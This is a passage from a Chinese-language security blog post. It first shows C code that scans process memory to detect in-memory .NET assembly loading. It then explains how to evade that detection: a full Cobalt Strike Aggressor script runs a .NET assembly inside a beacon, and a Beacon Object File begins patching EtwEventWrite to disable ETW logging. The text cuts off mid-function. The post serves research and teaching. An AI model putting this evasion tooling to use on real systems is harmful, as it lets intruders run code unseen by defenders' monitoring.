dwFileSize);</div><div class="line"><span class="selector-tag">SafeArrayUnaccessData</span>(pSafeArray);</div><div class="line"><span class="comment">//检测点2</span></div><div class="line"><span class="selector-tag">pDefaultAppDomain-</span>&gt;<span class="selector-tag">Load_3</span>(pSafeArray, &amp;pAssembly);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并在memcpy函数执行之后的目的地址下一个执行断点，并执行。这一步是为了定位需要加载的程序集在Assembly Loader进程中的位置。因为Assembly内存加载，程序集必然在进程的内存空间中。只是需要定位在哪里？且那块内存的内存属性和类型。<br>    <img src="http://hacky.wang/blog/20221106/v2mzD38DdnOO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20221106/iRXfBirGesVi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到程序集保存在内存类型为<code>MEM_COMMIT</code>和<code>MEM_PRIVATE</code>以及保护类型为<code>PAGE_READWRITE</code>的内存块<br>    <img src="http://hacky.wang/blog/20221106/FV5jiQTNxadO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20221106/dQi0NPKfkE8R.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整个扫描逻辑就很简单了，只需要调用VirtualQueryEx获取内存信息，只需要选择内存类型为<code>MEM_COMMIT</code>和<code>MEM_PRIVATE</code>以及保护类型为<code>PAGE_READWRITE</code>的内存块。然后扫描PE头信息即可。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">BOOL DetectByMemory(HANDLE hProcess)</div><div class="line">&#123;</div><div class="line">UCHAR SignMemory[] = &#123; <span class="number">0x54</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x20</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x67</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x6D</span>,<span class="number">0x20</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6E</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x62</span>,<span class="number">0x65</span>,<span class="number">0x20</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x44</span>,<span class="number">0x4F</span>,<span class="number">0x53</span>,<span class="number">0x20</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x64</span>,<span class="number">0x65</span> &#125;;</div><div class="line">BOOL bIsExecuteFile = <span class="literal">FALSE</span>;</div><div class="line">if (NULL == hProcess)</div><div class="line">return bIsExecuteFile;</div><div class="line">SYSTEM_INFO sysInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">GetSystemInfo(&amp;sysInfo);</div><div class="line">MEMORY_BASIC_INFORMATION pMemInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">DWORD dwErrorCode;</div><div class="line"></div><div class="line">for (DWORD64 MemoryAddress = (DWORD64)sysInfo.lpMinimumApplicationAddress; MemoryAddress &lt; (DWORD64)<span class="number">0x700000000000</span>; MemoryAddress += pMemInfo.RegionSize) <span class="comment">//0x7ff4e85d0000   0x70000000</span></div><div class="line">&#123;</div><div class="line">if (bIsExecuteFile == <span class="literal">TRUE</span>)</div><div class="line">break;</div><div class="line">if (VirtualQueryEx(hProcess, (LPVOID)MemoryAddress, &amp;pMemInfo, sizeof(MEMORY_BASIC_INFORMATION)) == <span class="number">0</span>)</div><div class="line">break;</div><div class="line"></div><div class="line">if ((pMemInfo.Type == MEM_COMMIT || pMemInfo.Type == MEM_PRIVATE) &amp;&amp; pMemInfo.Protect == PAGE_READWRITE) <span class="comment">//</span></div><div class="line">&#123;</div><div class="line">PVOID pMemoryBuffer = malloc(pMemInfo.RegionSize + <span class="number">1</span>);</div><div class="line">memset(pMemoryBuffer, <span class="number">0</span>, pMemInfo.RegionSize + <span class="number">1</span>);</div><div class="line">SIZE_T dwReturnNumber = <span class="number">0</span>;</div><div class="line">if (ReadProcessMemory(hProcess, pMemInfo.BaseAddress, pMemoryBuffer, pMemInfo.RegionSize, &amp;dwReturnNumber) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] ReadProcessMemory Failed<span class="subst">\n</span>"</span>);</div><div class="line">free(pMemoryBuffer);</div><div class="line">pMemoryBuffer = NULL;</div><div class="line">continue;</div><div class="line">&#125;</div><div class="line">for (DWORD64 dwIndex = <span class="number">0</span>; dwIndex &lt; pMemInfo.RegionSize + <span class="number">1</span>; dwIndex++)</div><div class="line">&#123;</div><div class="line">if ((memcmp((PVOID)((DWORD64)pMemoryBuffer + dwIndex), SignMemory, sizeof(SignMemory)) == <span class="number">0</span>) &amp;&amp;</div><div class="line">(memcmp((PVOID)((DWORD64)pMemoryBuffer + dwIndex - <span class="number">0x4E</span>), <span class="string">"MZ"</span>, <span class="number">2</span>) == <span class="number">0</span>))</div><div class="line">&#123;</div><div class="line">bIsExecuteFile = <span class="literal">TRUE</span>;</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">free(pMemoryBuffer);</div><div class="line">pMemoryBuffer = NULL;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">return bIsExecuteFile;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x03-绕过上述检测"><a href="#0x03-绕过上述检测" class="headerlink" title="0x03 绕过上述检测"></a>0x03 绕过上述检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过上述检测的最简单的思路就是Patch ETW。而我想的是使用BOF进行Bypass ETW 以及Assembly加载。值得庆幸得是CobaltStrike官方以及有大佬已经做了这一部分的研究。</p><h3 id="0x3-1-脚本学习"><a href="#0x3-1-脚本学习" class="headerlink" title="0x3.1  脚本学习"></a>0x3.1  脚本学习</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在官方的文档<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">Beacon Object Files</a>中，详细描写了怎么使用CNA和BOF。根据文档提供的例子。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">alias hello &#123;</div><div class="line">local('$barch $handle $data $args');</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> figure out the arch of this session</span></div><div class="line"><span class="meta">$</span><span class="bash">barch  = barch(<span class="variable">$1</span>);</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">read</span> <span class="keyword">in</span> the right BOF file</span></div><div class="line"><span class="meta">$</span><span class="bash">handle = openf(script_resource(<span class="string">"hello. $+ <span class="variable">$barch</span> $+ .o"</span>));</span></div><div class="line"><span class="meta">$</span><span class="bash">data   = readb(<span class="variable">$handle</span>, -1);</span></div><div class="line"><span class="meta">closef($</span><span class="bash">handle);</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> pack our arguments</span></div><div class="line"><span class="meta">$</span><span class="bash">args   = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>, <span class="string">"Hello World"</span>, 1234);</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> announce what we<span class="string">'re doing</span></span></div><div class="line"><span class="meta">btask($</span><span class="bash">1, <span class="string">"Running Hello BOF"</span>);</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> execute it.</span></div><div class="line"><span class="meta">beacon_inline_execute($</span><span class="bash">1, <span class="variable">$data</span>, <span class="string">"demo"</span>, <span class="variable">$args</span>);</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>local</code>定义了本地变量。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">local(<span class="string">'<span class="variable">$barch</span> <span class="variable">$handle</span> <span class="variable">$data</span> <span class="variable">$args</span>'</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>barch</code>函数获取进程架构，以此后续拼接读取BOF时使用。参数$1表示的是当前会话的ID。Alias的参数有3个。</p><ul><li>$0 是我们起的别名和传输的参数</li><li>$1 是当前会话的 ID</li><li>$2-3-4….第二个参数及以后，就是我们 是我们传递的参数，他们由空格隔开，我们举一个例子：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> figure out the arch of this session</span></div><div class="line"><span class="meta">$</span><span class="bash">barch  = barch(<span class="variable">$1</span>);</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过<code>readb</code>读取BOF文件(.obj)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">read</span> <span class="keyword">in</span> the right BOF file</span></div><div class="line"><span class="meta">$</span><span class="bash">handle = openf(script_resource(<span class="string">"hello. $+ <span class="variable">$barch</span> $+ .o"</span>));</span></div><div class="line"><span class="meta">$</span><span class="bash">data   = readb(<span class="variable">$handle</span>, -1);</span></div><div class="line"><span class="meta">closef($</span><span class="bash">handle);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后再将参数打包。参数1 <code>$1</code>表示会话ID,第二个参数是传入参数的类型，参数类型如下。从第三个参数就是传入的参数。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">Type</span>Description                      Unpack With (C)</div><div class="line"><span class="keyword">b</span>    <span class="keyword">binary </span><span class="meta">data</span>                     <span class="keyword">BeaconDataExtract</span></div><div class="line"><span class="keyword">i</span>    <span class="number">4</span>-<span class="keyword">byte </span>integer                  <span class="keyword">BeaconDataInt</span></div><div class="line"><span class="keyword">s</span>    <span class="number">2</span>-<span class="keyword">byte </span>short integer            <span class="keyword">BeaconDataShort</span></div><div class="line"><span class="keyword">z</span>    zero-terminated+encoded <span class="keyword">string </span>     <span class="keyword">BeaconDataExtract</span></div><div class="line"><span class="keyword">Z</span>    zero-terminated wide-char <span class="keyword">string</span>(wchar_t *)<span class="keyword">BeaconDataExtract</span></div></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pack our arguments</span></div><div class="line"><span class="meta">$</span><span class="bash">args   = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>, <span class="string">"Hello World"</span>, 1234);</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后调用<code>beacon_inline_execute</code>,其实就是执行inline_execute命令。第三个参数是入口点函数。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> execute it.</span></div><div class="line"><span class="meta">beacon_inline_execute($</span><span class="bash">1, <span class="variable">$data</span>, <span class="string">"demo"</span>, <span class="variable">$args</span>);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要参考Sleep语言的说明<a href="http://sleep.dashnine.org/manual/index.html" target="_blank" rel="external">http://sleep.dashnine.org/manual/index.html</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">beacon_command_register(</div><div class="line"><span class="string">"InlineExecute_Assembly"</span>, </div><div class="line"><span class="string">"test1"</span>, </div><div class="line"><span class="string">"test2"</span>);</div><div class="line"></div><div class="line">alias InlineExecute_Assembly&#123;</div><div class="line"><span class="variable">$data</span> = <span class="built_in">substr</span>(<span class="variable">$0</span>, 5);</div><div class="line">@<span class="keyword">args</span> = <span class="keyword">split</span>(' ', <span class="variable">$data</span>);</div><div class="line">println(@<span class="keyword">args</span>); </div><div class="line"></div><div class="line"><span class="keyword">local</span>('<span class="variable">$AssemblyPath</span> <span class="variable">$AssemblyArgs</span>');</div><div class="line"><span class="variable">$AssemblyPath</span> = <span class="string">""</span>;</div><div class="line"><span class="variable">$AssemblyArgs</span> = <span class="string">""</span>;</div><div class="line"></div><div class="line">@Optional = @(<span class="string">"--AssemblyPath"</span> , <span class="string">"--AssemblyArgs"</span>);</div><div class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; size(@<span class="keyword">args</span>) ; <span class="variable">$i</span>++)&#123;</div><div class="line"><span class="keyword">if</span> (@<span class="keyword">args</span>[<span class="variable">$i</span>] <span class="keyword">eq</span> <span class="string">"--AssemblyPath"</span>)&#123;</div><div class="line"><span class="keyword">if</span>(@<span class="keyword">args</span>[<span class="variable">$i</span> + 1] ne <span class="string">""</span>)&#123;</div><div class="line"><span class="variable">$AssemblyPath</span> = @<span class="keyword">args</span>[<span class="variable">$i</span> + 1];</div><div class="line">#println(<span class="variable">$AssemblyPath</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (@<span class="keyword">args</span>[<span class="variable">$i</span>] <span class="keyword">eq</span> <span class="string">"--AssemblyArgs"</span>)&#123;</div><div class="line"><span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> + 1; <span class="variable">$j</span> &lt; size(@<span class="keyword">args</span>) ; <span class="variable">$j</span>++)&#123;</div><div class="line"><span class="keyword">if</span>(@<span class="keyword">args</span>[<span class="variable">$j</span>] <span class="keyword">in</span> @Optional)&#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$AssemblyArgs</span>) == 0)&#123;</div><div class="line"><span class="variable">$AssemblyArgs</span> = @<span class="keyword">args</span>[<span class="variable">$j</span>]</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="variable">$AssemblyArgs</span> = <span class="variable">$AssemblyArgs</span>.<span class="string">" "</span>.@<span class="keyword">args</span>[<span class="variable">$j</span>];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">#println(<span class="variable">$AssemblyArgs</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"># charge AssemblyPath is invaid</div><div class="line"><span class="keyword">if</span>(<span class="variable">$AssemblyPath</span> <span class="keyword">eq</span> <span class="string">""</span> || !-exists <span class="variable">$AssemblyPath</span> || !-isFile <span class="variable">$AssemblyPath</span>)&#123;</div><div class="line">println(<span class="variable">$AssemblyPath</span>.<span class="string">" is vailed or does not exist\n"</span>);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line">    </div><div class="line">    # <span class="keyword">read</span> .<span class="keyword">Net</span></div><div class="line"><span class="variable">$AssemblyHandle</span> = openf(<span class="variable">$AssemblyPath</span>);</div><div class="line"><span class="variable">$AssemblyLength</span> = lof(<span class="variable">$AssemblyPath</span>);</div><div class="line"><span class="variable">$AssemblyBytes</span> = readb(<span class="variable">$AssemblyHandle</span> , -1);</div><div class="line">closef(<span class="variable">$AssemblyHandle</span>);</div><div class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$AssemblyBytes</span>) == 0)&#123;</div><div class="line">println(<span class="variable">$AssemblyPath</span>.<span class="string">"load failed \n"</span>);</div><div class="line">&#125;</div><div class="line">println(<span class="string">"size of .Net is: "</span>.<span class="variable">$AssemblyLength</span>);</div><div class="line"></div><div class="line"># load bof</div><div class="line"><span class="variable">$barch</span>  = barch(<span class="variable">$1</span>);</div><div class="line"><span class="variable">$BofPath</span> = script_resource(<span class="string">"InlineExecute_Assembly_ $+ $barch $+ .obj"</span>);</div><div class="line"></div><div class="line"><span class="variable">$BofHandle</span> = openf(<span class="variable">$BofPath</span>);</div><div class="line"><span class="variable">$BofBytes</span> = readb(<span class="variable">$BofHandle</span>, -1);</div><div class="line">closef(<span class="variable">$BofHandle</span>);</div><div class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$BofBytes</span>) == 0)&#123;</div><div class="line">println(<span class="variable">$BofPath</span>.<span class="string">" load failed \n"</span>);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line">println(<span class="string">"bof file path is: "</span>.<span class="variable">$BofPath</span>);</div><div class="line">println(<span class="string">"size of bof file is:"</span>.lof(<span class="variable">$BofPath</span>));</div><div class="line"></div><div class="line">println(<span class="string">"args is:"</span>.<span class="variable">$AssemblyArgs</span>);</div><div class="line"><span class="variable">$bofArgs</span> = bof_pack(<span class="variable">$1</span>, <span class="string">"biz"</span>,  <span class="variable">$AssemblyBytes</span> , <span class="variable">$AssemblyLength</span> , <span class="variable">$AssemblyArgs</span>);</div><div class="line">#<span class="variable">$bofArgs</span> = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>,  <span class="variable">$BofPath</span> , <span class="variable">$AssemblyLength</span>);</div><div class="line">btask(<span class="variable">$1</span>, <span class="string">"Running Inline_Execute Assembly BOF"</span>);</div><div class="line">beacon_inline_execute(<span class="variable">$1</span>, <span class="variable">$BofBytes</span>, <span class="string">"go"</span>, <span class="variable">$bofArgs</span>);</div><div class="line"></div><div class="line"><span class="keyword">clear</span>(@Optional);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x3-2-BOF编写"><a href="#0x3-2-BOF编写" class="headerlink" title="0x3.2 BOF编写"></a>0x3.2 BOF编写</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF主要需要实现两个点，第一实现ByPass ETW，第二需要实现Assembly加载。先看官方给的例子。首先使用<code>BeaconDataParse</code>解析参数，然后调用<code>BeaconDataExtract</code>和<code>BeaconDataInt</code>依次获取string类型和int类型。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BeaconDataParse(<span class="name">&amp;parser</span>, args, length)<span class="comment">;</span></div></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beacon.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">demo</span><span class="params">(<span class="keyword">char</span> * args, <span class="keyword">int</span> length)</span> </span>&#123;</div><div class="line">datap  parser;</div><div class="line"><span class="keyword">char</span> * str_arg;</div><div class="line"><span class="keyword">int</span>    num_arg;</div><div class="line"></div><div class="line">BeaconDataParse(&amp;parser, args, length);</div><div class="line">str_arg = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">num_arg = BeaconDataInt(&amp;parser);</div><div class="line"></div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"Message is %s with %d arg"</span>, str_arg, num_arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中Bypass ETW原理很简单，只需要Patch <code>EtwEventWrite</code>或者<code>EtwEventWriteFull</code>函数，而Assembly Load就是上面所描述的四个步骤即可。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include <span class="meta-string">"InlineExecute_Assembly.h"</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">"beacon.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#define STATUS_SUCCESS 0</span></div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> PatchETW()</div><div class="line">&#123;</div><div class="line">LPVOID pEtwEventWrite = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA(<span class="string">"ntdll.dll"</span>), <span class="string">"EtwEventWrite"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (pEtwEventWrite == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] pEtwEventWrite Failed"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] pEtwEventWrite Success"</span>);</div><div class="line"></div><div class="line">DWORD 